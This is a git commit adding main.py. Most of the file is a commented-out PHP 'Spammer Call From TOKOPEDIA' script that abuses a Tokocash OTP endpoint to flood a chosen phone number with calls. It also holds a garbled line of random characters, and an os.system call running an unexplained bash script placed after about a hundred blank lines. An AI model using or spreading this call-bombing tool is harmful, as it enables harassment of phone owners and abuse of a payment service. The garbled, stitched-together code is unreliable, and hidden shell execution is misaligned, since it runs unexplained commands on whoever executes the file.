26bc295a0a215cd753f5ec04bf58fb9837b69898
Fhans Moby <79772837+Fhans-moby@users.noreply.github.com>
2021-03-01 14:21:44 +0700

    Add files via upload

---
+++ main.py
@@ -0,0 +1,155 @@
+
+
+
+
+
+
+#<?php
+#// Limit 3x Telpon Setiap Satu Nomor
+#function send($phone){
+       # $ch = curl_init();
+        #curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CU                       >
+       # curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+      #  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+     #   curl_setopt($ch, CURLOPT_HEADER, true);
+    #    curl_setopt($ch, CURLOPT_POST, 1);
+   #     curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($c                       >
+  #      curl_close($ch);
+ #               echo $asw."\n";
+#}
+#echo "
+############################################################
+    #Spammer Call From TOKOPEDIA
+   #     Author By   : NecDitya
+  #   Penggunaannya  : Bisa Menggunakan [08/62]
+############################################################\n";
+#echo "Nomor\nInput : ";
+#$nomor = trim(fgets(STDIN));
+#$execute = send($nomor);
+#print $execute;
+#?>
+#impot:https://github.com/Fhans-mOby/Dark-Dana,"instant no sg({data={nomot, input +)8655858jcfiuscyhvtxbcjtxnyyxk(jgl-)hohhif9glvlfof:(bkgd&of8d9f9&8#+$!%8%+$+$# 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+import os
+import sys
+import time
+from time import sleep
+
+
+
+
+os.system('bash __NETWORK_PROVIDER__')
